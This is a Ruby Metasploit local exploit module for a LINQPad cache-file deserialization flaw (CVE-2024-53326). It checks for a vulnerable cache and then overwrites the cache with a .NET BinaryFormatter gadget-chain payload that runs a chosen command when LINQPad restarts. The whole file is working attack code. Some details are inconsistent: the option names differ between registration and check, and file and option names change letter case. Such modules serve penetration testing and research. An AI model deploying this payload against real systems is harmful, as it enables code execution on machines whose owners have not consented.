##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  # includes file?, directory?
  include Msf::Post::File

  # includes generate
  include Msf::Util::DotNetDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LINQPad Deserialization Exploit',
        'Description' => %q{
          This module exploits a bug in LIQPad up to version 5.48.00. The bug is only exploitable in paid version of software. The core of a bug is cache file containing deserialized data, which attacker can overwrite with malicious payload. The data gets deserialized every time the app restarts.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'msutovsky-r7 <martin_sutovsky@rapid7.com>',
          'James Williams' # original research
        ],
        'Platform' => 'win',
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Windows', { 'Arch' => ARCH_CMD } ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://trustedsec.com/blog/discovering-a-deserialization-vulnerability-in-linqpad'],
          [ 'CVE', '2024-53326']
        ],
        'DisclosureDate' => '2024-12-03',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('LINQPAD_FILE', [true, 'Path to LINQPad executable on target\'s machine']),
      OptString.new('CACHE_PATH', [true, 'Path to cache file directory containing deserialized data']),
      OptBool.new('CLEANUP', [false, 'Restore original cache file when exploit finish'])
    ])
  end

  # Simplify pulling the writable directory variable

  def check
    if datastore['LINQPAD_PATH'].blank? || !file?(datastore['LINQPAD_PATH'])
      return Exploit::CheckCode::Unknown('LINQPad binary not specified or doesn\'t exist')
    elsif datastore['CACHE_PATH'].blank? || !directory?(datastore['Cache_path']) || !file?(datastore['CACHE_PATH'] + '/autorefcache46.1.dat')
      return Exploit::CheckCode::Unknown('Cache directory doesn\'t exist')
    elsif !file?(datastore['CACHE_PATH'] + '/autorefcache46.1.dat')
      return Exploit::CheckCode::Unknown('Cannot find cache file')
    elsif file?(datastore['CACHE_PATH'] + '/autorefcache46.2.dat')
      return Exploit::CheckCode::Safe('Contains not vulnerable version of LINQPad')
    else
      return Exploit::CheckCode::Vulnerable('LINPad and vulnerable cache file present, target possibly exploitable')
    end
  end

  def exploit
    # generate payload
    dotnet_payload = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded, # this is the Operating System command to run
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    # try to overwrite cache file
    fail_with(Failure::PayloadFailed, 'Writing payload to cache file failed') unless write_file(datastore['CACHE_PATH'] + '/AutoRefCache46.1.dat', dotnet_payload)

    # add cleanup option
    register_file_for_cleanup(datastore['CACHE_PATH']) if datastore['CLEANUP']
  end
end
